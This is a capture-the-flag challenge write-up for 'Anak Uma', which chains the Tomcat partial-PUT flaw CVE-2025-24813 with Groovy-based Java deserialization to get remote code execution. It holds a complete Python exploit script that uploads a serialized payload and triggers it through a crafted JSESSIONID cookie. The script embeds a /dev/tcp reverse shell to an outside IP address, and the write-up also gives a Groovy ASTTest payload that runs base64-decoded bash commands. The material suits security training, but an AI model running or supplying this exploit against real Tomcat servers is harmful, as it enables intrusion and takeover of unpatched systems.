# Data
## Title
- Anak Uma
## Author
- Dimas Maulana
## FLAG
- VincooCTF{...}
## Description
Are u hacker? so please solve and get the flag from this Anak Uma website mwehehehehe :3

Start challenge from: https://{{.host}}/{{.slug}}
## Hints
- Read the index.jsp from that u will get the next clue about custom library i use, don't forget this is about CVE too not only file read.


# Synopsis (!)

In this challenge, the user must exploit a combination of Apache Tomcat's PUT method vulnerability (CVE-2025-24813) and Java deserialization with Groovy scripting to achieve remote code execution and retrieve the flag.

## Description (!)

The user is provided with an Apache Tomcat 9.0.98 application that has been configured to allow PUT requests and file uploads. The application includes a custom Java library with Groovy scripting capabilities that can be exploited through session deserialization. The user must chain these vulnerabilities to achieve remote code execution and read the flag file.

## Skills Required (!)

- Java Deserialization
- Apache Tomcat Configuration Analysis
- Groovy Scripting
- Session Manipulation
- HTTP PUT Method Exploitation
- Reverse Shell Techniques

## Skills Learned (!)

- Learn how to exploit Apache Tomcat's PUT method vulnerability
- Understand Java deserialization with Groovy scripting
- Master session-based exploitation techniques
- Learn about CVE-2025-24813 and its exploitation

# Solution (!)

## Finding the Vulnerability (*)

The challenge involves two main vulnerabilities that need to be chained:

1. **CVE-2025-24813**: Apache Tomcat's PUT method vulnerability allowing file uploads
2. **Java Deserialization**: Custom deserialization logic that executes Groovy scripts

### CVE-2025-24813 Analysis

The vulnerability stems from the web.xml configuration that enables PUT requests:

```xml
<init-param>
    <param-name>readonly</param-name>
    <param-value>false</param-value>
</init-param>
<init-param>
    <param-name>allowPut</param-name>
    <param-value>true</param-value>
</init-param>
```

This allows attackers to upload files to the web application directory using HTTP PUT requests.

### Session Deserialization Vulnerability

The `Testing` class has a custom `readObject` method that processes Groovy scripts during deserialization. When a serialized `Testing` object is deserialized, any Groovy script stored in the `groovyScript` field will be parsed and potentially executed.

## Exploitation (!)

### Understanding the Exploit Chain (*)

The exploitation involves several steps:

1. **File Upload**: Use the PUT method to upload a serialized Java object containing a malicious Groovy script
2. **Session Manipulation**: Trigger deserialization by accessing the uploaded file as a session
3. **Code Execution**: The Groovy script executes arbitrary code, allowing us to read the flag

### Crafting the Payload

The exploit script generates a serialized `Testing` object with a malicious Groovy script:

```python
def payload_generator(shellcode):
    return subprocess.check_output(["java", "-jar", "lib/target/demo-1.0-SNAPSHOT.jar", shellcode]).decode()
```

The Java application in the `lib` directory creates a serialized object with the provided shellcode as a Groovy script.

### Uploading the Payload

The exploit uploads the serialized payload using a PUT request:

```python
put_url = f"{TARGET_IP}/payload.session"
put_headers = {"Content-Range": "bytes 0-5/100"}

put_response = requests.put(put_url, data=decoded_content, headers=put_headers)
```

The `Content-Range` header is used to bypass certain restrictions, and the file is named with a `.session` extension to be treated as a session file.

### Triggering Deserialization

The exploit triggers deserialization by accessing the uploaded file as a session:

```python
get_headers = {"Cookie": "JSESSIONID=.payload"}
get_response = requests.head(TARGET_IP, headers=get_headers)
```

By setting the `JSESSIONID` cookie to `.payload`, Tomcat attempts to load the uploaded file as a session, triggering the deserialization process.

### Getting the Flag (!)

Here's the complete exploitation process:

1. **Generate the payload**: Create a serialized `Testing` object with a reverse shell Groovy script
2. **Upload the payload**: Use PUT request to upload the serialized object
3. **Trigger deserialization**: Access the file as a session to trigger the `readObject` method
4. **Execute code**: The Groovy script executes the reverse shell command

**Solve Script**

```python
import requests
import base64
import os, subprocess
import argparse

def payload_generator(shellcode):
    return subprocess.check_output(["java", "-jar", "lib/target/demo-1.0-SNAPSHOT.jar", shellcode]).decode()

def main():
    parser = argparse.ArgumentParser(description="CVE-2025-24813 Apache Tomcat Vulnerability PoC")
    parser.add_argument('--url', required=True, help='Target URL, e.g., http://127.0.0.1:8080/')
    args = parser.parse_args()

    TARGET_IP = args.url.rstrip('/')

    # Check if URL starts with http:// or https://
    if not (TARGET_IP.startswith('http://') or TARGET_IP.startswith('https://')):
        print("Error: URL must start with 'http://' or 'https://'.")
        return

    # Generate payload with reverse shell command
    b64_encoded_payload = payload_generator("sh -i >& /dev/tcp/13.58.157.220/19265 0>&1")

    decoded_content = base64.b64decode(b64_encoded_payload)

    # Upload the serialized payload
    put_url = f"{TARGET_IP}/payload.session"
    put_headers = {"Content-Range": "bytes 0-5/100"}

    put_response = requests.put(put_url, data=decoded_content, headers=put_headers)

    # Trigger deserialization by accessing as session
    get_headers = {"Cookie": "JSESSIONID=.payload"}
    get_response = requests.head(TARGET_IP, headers=get_headers)
    print(get_response.text)

    # Check the response status
    if get_response.status_code == 500:
        print("[+] Exploit most likely succeeded")
    else:
        print(f"[-] Exploit failed with status code: {get_response.status_code}, instead of 500,409")

if __name__ == "__main__":
    main()
```

> Note: Don't forget to change '13.58.157.220/19265' to your public ip and port

**Outcome**

When executed, the script:
1. Generates a serialized Java object containing a Groovy script that creates a reverse shell
2. Uploads this object to the target using a PUT request
3. Triggers deserialization by accessing the file as a session
4. The Groovy script executes, creating a reverse shell connection
5. Through the reverse shell, the attacker can execute `/readflag` to retrieve the flag: `HTB{CVE-2025-24813_plus_gr0vy_met4_pr0gramming_is_the_best}`

The exploit demonstrates the dangerous combination of file upload vulnerabilities with insecure deserialization practices, highlighting the importance of proper input validation and secure coding practices.

### Payload Generator (App.java)

A key part of the exploitation process is the payload generator script located at `htb/lib/src/main/java/com/example/App.java`. This Java program is responsible for creating the serialized object payload used in the attack.

#### How It Works

- The script creates an instance of the `Testing` class, which is serializable and contains a `groovyScript` field.
- It takes a command-line argument (the shell command to execute on the target) and encodes it in base64.
- Using Java reflection, it sets the `groovyScript` field of the `Testing` object to a Groovy script payload. This payload uses the `@groovy.transform.ASTTest` annotation, which is evaluated at compile-time (parsing phase) by Groovy's AST transformation mechanism.
- The payload, when parsed by Groovy, executes the provided shell command using `java.lang.Runtime.getRuntime().exec(...)`. The command is decoded from base64 to avoid issues with special characters.
- The script then serializes the `Testing` object and outputs the serialized bytes as a base64 string, which can be used as the exploit payload.

#### Example Payload Logic

```java
String payload = "@groovy.transform.ASTTest(value={\r\n" +
    "    assert java.lang.Runtime.getRuntime().exec(\"bash -c {echo,"+base64Command+"}|{base64,-d}|{bash,-i}\")\r\n" +
    "})\r\n" +
    "def x\r\n";
```

This leverages Groovy's ASTTest annotation to trigger code execution during the parsing phase, as described in the meta-programming section above.